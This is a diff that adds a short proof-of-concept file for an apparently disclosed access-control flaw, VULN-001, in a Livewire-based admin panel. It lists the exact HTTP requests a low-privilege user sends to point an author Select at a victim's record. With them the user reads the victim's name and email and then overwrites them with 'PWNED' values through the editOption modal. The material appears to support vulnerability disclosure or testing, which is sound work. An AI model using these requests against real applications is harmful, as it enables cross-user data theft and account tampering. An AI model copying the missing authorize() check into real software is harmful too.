@@ -1,0 +1,18 @@
+### VULN-001 — decisive requests. Full capture in response.txt / run.log.
+### data.author_id is public Livewire state. editOption resolves the record via
+### Relation::noConstraints filtered by the client PK alone, with NO ->authorize().
+
+### 1) Snapshot — Post edit page (authed low-priv user). author Select has editOptionForm.
+GET /admin/posts/1/edit HTTP/1.1
+Host: localhost:21890
+
+### 2) READ: point the Select at a victim user PK and mount the editOption action
+POST /livewire/update  (updates: {"data.author_id": <victim_id>};
+  calls: mountAction "editOption" {} {"recordKey":"1","schemaComponent":"form.author_id"})
+### → the mounted modal is filled with getSelectedRecord()->attributesToArray()
+###   (the victim's name/email appear in the returned snapshot) = cross-user READ
+
+### 3) WRITE: submit the modal with attacker values
+POST /livewire/update  (updates: {"mountedActions.0.data.name":"PWNED ...",
+  "mountedActions.0.data.email":"pwned_...@attacker.invalid"}; calls: callMountedAction)
+### → default updateOptionUsing runs $record->update($data) on the VICTIM row = cross-user WRITE
